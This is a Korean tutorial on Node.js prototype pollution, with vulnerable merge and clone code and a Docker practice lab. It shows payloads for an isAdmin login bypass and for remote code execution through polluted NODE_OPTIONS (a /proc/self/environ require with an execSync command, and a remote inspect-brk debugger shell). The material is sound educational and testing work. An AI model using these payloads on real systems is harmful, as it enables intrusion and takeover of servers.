# Node.js Proto Pollution

Created: 2021년 11월 16일 오후 4:25
Tags: hacking, javascript, node.js, web

# "__proto__?"

객체의 프로토타입을 참조하는 __proto__는 보편적으로 객체의 프로토타입을 참조할 때 사용된 기능입니다.  본 글에서는 javascript의 프로토타입 개념에 대해서는 기술하지 않으니 MDN의 공식 문서를 참고하길 바랍니다.

[Object prototypes - Web 개발 학습하기 | MDN](https://developer.mozilla.org/ko/docs/Learn/JavaScript/Objects/Object_prototypes)

# 프로토타입 오염이란?

프로토타입 오염은 객체의 __proto__는 Object.prototype과 같다는 것을 이용해 다른 객체 속성의 영향을 주는 방식입니다.

어떻게 영향을 줄까요?

```jsx
const obj1 = {}
const obj2 = {}

obj1.__proto__.name = 'kim';

console.log(obj2.name); // kim
```

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled.png)

# !?

예제에서 obj1의 프로토타입 name을 조작했습니다. 근데? obj2의 속성의 값도 역시 같이 조작됩니다.

둘은 서로 다른 객체지만 결국 같은 부모인 Object를 참조하게 됩니다. 일반적인 객체지향 언어인 JAVA나 C++은 상속을 이용해 부모의 property나 method에 접근하지만 javascript는 prototype을 통해서 부모에게 접근합니다.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%201.png)

자바스크립트의 객체는 메소드나 프로퍼티를 참조했을 경우 해당 값이 존재하지 않으면[[Prototype]]에 값으로 설정된 부모 객체로 넘어가 부모 객체의 프로퍼티나 메소드의 값을 참조하게 됩니다.

자 그럼 이게 도대체 왜 위험할까라는 생각을 할 수 있습니다. 예전에야 javascript는 client단에서 사용되는 이미지가 강했습니다.  하지만 시대가 변함에 따라 javascript는 node.js 등 웹 서버에서 핵심 엔진으로 떠오르고 있습니다.

보통 어떤 위험이 존재하는지 확인해봅니다. pollution을 통해서 서버에서 핵심 기능이 되는 프로퍼티나 메소드를 오염시킨다면 어떻게 될까요?  당연히 제대로 된 로직이 동작하지 않을 것이며 서버는 다운 됩니다.

아주 많은 오픈소스에서  SQL Injection, RCE, DOS 등 무수히 많은 취약점이 발표 되었으며 서버 단 소스코드에서 객체의 프로퍼티와 메소드를 변조할 수 있다는 건 정말 위험한 일입니다.

# 위험한 경우?

아래 3가지 예제에서 많이 발견 된다고 합니다. 코드는 첫번째 레퍼런스에서 가져왔습니다.

기본적으로 사용자의 입력을 받아서 객체를 생성하고 수정할 수 있을 때 발생하는 것으로 보입니다.

### 1. 속성 설정

```jsx
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}
 
function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}
 
const obj1 = {};
setValue(obj1, "__proto__.polluted", 1);
const obj2 = {};
console.log(obj2.polluted); // 1
```

### 2. 객체 병합

```bash
function merge(a, b) {
  for (let key in b) {
    if (isObject(a[key]) && isObject(b[key])) {
      merge(a[key], b[key]);
    } else {
      a[key] = b[key];
    }
  }
  return a;
}
 
const obj1 = {a: 1, b:2};
const obj2 = JSON.parse('{"__proto__":{"polluted":1}}');
merge(obj1, obj2);
const obj3 = {};
console.log(obj3.polluted); // 1
```

### 3. 객체 복사

```bash
function clone(obj) {
  return merge({}, obj);
}
 
const obj1 = JSON.parse('{"__proto__":{"polluted":1}}');
const obj2 = clone(obj1);
const obj3 = {};
console.log(obj3.polluted); // 1
```

# 오염은 어떻게 시작할까?(logical vector bypass)

간단하게 예를 들어 설명하겠습니다. 아래 소스코드를 확인하면 세션의 `isAdmin` 을 값을 이용해 관리자 여부를 체크하고 있습니다. 이를 pollution을 이용해 우회 해보겠습니다.

```jsx
app.get('/admin', (req, res) => {
   var msg;
   try {
      if(req.session.user.isAdmin == true)
      {
         fork('hello.js');
         res.render('debug');
      } else {
         msg = `<script>alert('관리자만 접근 가능합니다.'); location.href='/';</script>`;
         res.send(msg);
      }
   } catch(e) {
      console.log(e)
      msg = `<script>alert('관리자만 접근 가능합니다.'); location.href='/';</script>`;
      res.send(msg);
   }
});
```

계정을 생성하는 기능이 존재합니다. 아래 기능은 name과 age를 json형태로 서버에 등록 요청을 하는 모습입니다.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%202.png)

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%203.png)

서버의 소스코드를 살펴보면 전달받은 Json을 session.user 객체에 복사하는 과정을 가지네요.

```jsx
function isObject(obj) {
   return obj !== null && typeof obj === 'object';
 }

 function clone(obj) {
   return merge({}, obj);
 }

function merge(a, b) {

   for (let key in b) {
     if (isObject(a[key]) && isObject(b[key])) {
         merge(a[key], b[key]);
     } else {
         a[key] = b[key];
     }
   }
   return a;
 }

 //✨✨😃✨😃😃😃✨
app.post('/join', (req, res) => {
   console.log(req.session)
   **req.session.user = clone(req.body);**
   console.log("nice merge")
   console.log(req.isAdmin)
   res.render('join');
});
```

이제 여기서 우리는 `객체` 를 복사하는 점을 이용해 Object를 오염시켜야 합니다. 어떻게요? 아래 처럼 객체에 값을 넣을 때 `__proto__` 를 이용해 부모인 Object의 isAdmin 값을 `true`로 변경합니다.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%204.png)

 

자 그럼 이제 관리자 페이지에 접근을 하면? 관리자를 체크하는 로직을 우회할 수 있게 되었죠.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%205.png)

이유가 뭘까요?

일반 유저는 `req.session.user.isAdmin` 에 해당하는 값이 설정되어 있지 않았고 위에서 설명드린데로 부모에게 찾아가서 해당하는 method나 property가 있는지 탐색하게 됩니다.

pollution을 통해서 부모인 Object 객체는 `isAdmin` 값이 `true` 설정되어 있어 우회가 가능합니다.

# Attack Case

## Process spawning

nodejs의 서브 프로세스 생성 시 사용되는 내장 모듈 `child_process`는 자식 프로세스 생성 시 `process.env` 객체에서 환경 변수를 복사하는 과정을 거칩니다. 

```jsx
// Prototype values are intentionally included.
// https://github.com/nodejs/node/blob/master/lib/child_process.js#
for (const key in env) {
  ArrayPrototypePush(envKeys, key);
}

```

그럼 이제 nodejs RCE를 진행할 때 활용할 수 있는 환경변수를 알아봅시다.

## `NODE_OPTIONS`

해당 환경 변수는 스크립트가 실행되기 전에 —requeire [argv]를 추가해서 실행하는 것과 동일한 옵션이 됩니다.

```jsx
//아래와 같이 환경변수가 설정된다면.
NODE_OPTIONS = '--require /proc/self/environ' 

//node 프로세스 실행 시 아래와 같이 환경 변수에 저장된 코드가 시작할때 실행됩니다.
node app.js → node --require /proc/self/environ app.js
```

아직 무슨 얘기인지 잘 모르겠습니다. 천천히 정리를 하자면

1. `process.env` 객체에 저장된 환경 변수가 있습니다.
2. `child_process` 모듈을 이용해 자식 프로세스를 생성합니다.
3. 위 과정속에서 process.env에 저장된 환경 변수가 `for in` 을 통해 해당 프로세스의 환경 변수로 복사됩니다.

여기까지가 `child_process`의 환경 변수 복사 과정이였습니다.

자 그럼 위 루틴을 `NODE_OPTIONS` 환경 변수가 오염 되었다는 과정으로 다시 설명 해보겠습니다.

1. `process.env` 객체에 저장된 환경 변수가 있습니다. js pollution 으로 `NODE_OPTIONS` 와 `RCE` 라는 변수가 각각 설정 합니다.

```jsx
NODE_OPTIONS = "--require /proc/self/environ"
RCE = "require('child_process').execSync('mkdir rce!')"
```

1. `child_process` 모듈을 이용해 자식 프로세스를 생성합니다.  `process.env` 에 입력된 환경 변수가 자식 프로세스의 환경변수로 복사됩니다.
2. `NODE_OPTIONS`에 설정된 환경변수가 argument로 입력됩니다.
3. `RCE` 환경 변수에 설정된 명령어가 실행됩니다.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%206.png)

`**/proc/self/environ` 을 이용하는 방법의 단점은 리눅스 서버에서만 작동합니다.**

그럼 이제 Windows에서도 활용이 가능한 방법을 소개하겠습니다.

위 처럼 환경 변수를 이용해서 자식 프로세스가 생성될 때 공격자의 명령어가 입력이 되는 방법도 있지만 `inspect-brk`를 이용하면 디버깅 모드로 접근해 명령어를 실행할 수도 있습니다.

<aside>
💡 inspect-brk ?
입력된 주소 및 포트로 수신으로 하며 사용자 코드 시작 전에 멈춰 원격 디버깅을 기다립니다.

</aside>

`NODE_OPTIONS` 를 아래와 같이 오염시키면 디버깅을 기다리는 상태가 됩니다.

```jsx
NODE_OPTIONS = "--inspect-brk=0.0.0.0:1234"
```

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%207.png)

이후 공격자는 node inspect를 이용해 접근하면 리버스쉘같이 원격 쉘 명령어를 사용할 수 있습니다.

```jsx
$ node inspect 192.168.200.48:1234
debug> exec require("child_process").execSync("ls -al") + []
```

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%208.png)

## Code Execute

```jsx
app.get('/poll', function(req, res){
    let obj1 = {};
    let { key, key2, value } = req.query;

    if(key && key2 && value)
    {
        obj1[key][key2] = value
        res.send(obj)
    }

});

app.get('/execute', function(req, res){
    const obj1 = {}

    if(obj1.command)
    {
      eval(obj1.command);
      res.send("command execute : " + obj1.command);
    }
});
```

위와 같은 코드가 있다면 proto pollution을 통해서 RCE를 유발하기 좋은 상황이 됩니다.

`poll` 페이지에서 Object.prototype 객체를 오염시킬 수 있게 키와 값을 파라미터로 받고 있습니다.

`execute` 페이지에서는 obj1 객체의 command property가 있으면 eval을 통해서 명령어를 실행하고 있습니다.

`poll` 페이지에서 Object.prototype을 어떻게 오염시킬 수 있을까요?

아래와 같이 값을 전달 시킨다면 Object.prototype.command는 공격자가 입력한 명령으로 오염됩니다.

```jsx
key = __proto__
key2 = command
value = console.log('pollution')
```

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%209.png)

이후 `execute` 페이지로 접근하면? 명령어가 실행되는 걸 확인할 수 있습니다.

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%2010.png)

![Untitled](Node%20js%20Proto%20Pollution%20817c29c0cecd4443a4293fd135cf0f9f/Untitled%2011.png)

# 실습환경

모든걸 테스트해볼 수 있게 제작했으니 한번씩 해보시면 좋겠습니다..! 서버 소스코드를 확인하고 화이트박스 형식으로 취약점을 확인해주시면 됩니다.

계정 생성 시 `RangeError: Maximum call stack size exceeded` 에러 발생 시 컨테이너를 재시작하면 됩니다.

```bash
docker pull rbdhks9826/jspollution 
docker run --name jspollution -d -p 1111:1111 -p 1234:1234 rbdhks9826/jspollution:latest
```

# Reference

[https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/](https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/)

[https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

[https://blog.p6.is/prototype-pollution-to-rce/](https://blog.p6.is/prototype-pollution-to-rce/)